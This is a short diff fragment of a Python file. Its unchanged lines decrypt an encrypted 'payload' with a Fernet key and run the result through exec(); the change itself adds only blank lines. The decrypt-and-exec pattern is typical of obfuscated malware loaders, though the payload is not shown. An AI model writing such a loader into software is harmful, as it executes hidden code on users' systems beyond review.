@@ -10,3 +10,5 @@ key_base64 = base64.b64encode(key_str.encode())
 f = Fernet(key_base64)
 plain = f.decrypt(payload)
 exec(plain.decode())
+
+
